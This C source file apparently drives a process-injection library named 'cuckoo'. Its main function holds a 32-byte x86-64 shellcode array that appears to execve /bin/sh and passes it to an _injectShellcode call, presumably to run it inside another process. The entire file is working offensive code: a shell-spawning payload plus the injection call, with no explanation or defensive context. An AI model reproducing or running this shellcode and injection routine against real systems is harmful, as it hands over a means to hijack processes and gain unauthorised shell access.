#include <stdio.h>
#include <stdlib.h>
#include "utils.h"
#include "shellcode.h"
#include "cuckoo.h"


int __main(int argc, char *argv[])
{
    cuckoo_context context;    

    unsigned char shellcode[] = "\x48\x31\xc0\x48\x89\xc2\x48\x89"
        "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
        "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
        "\x2f\x73\x68\x00\xcc\x90\x90\x90";

    // DO NOT use strlen(), because shellcode has '\x00'
    size_t shellcode_len = 32;
    
    if (_injectShellcode(&context, shellcode, shellcode_len) != CUCKOO_OK)
    {
        oops("error ", CUCKOO_DEFAULT_ERROR);
    }
    return 0;
}
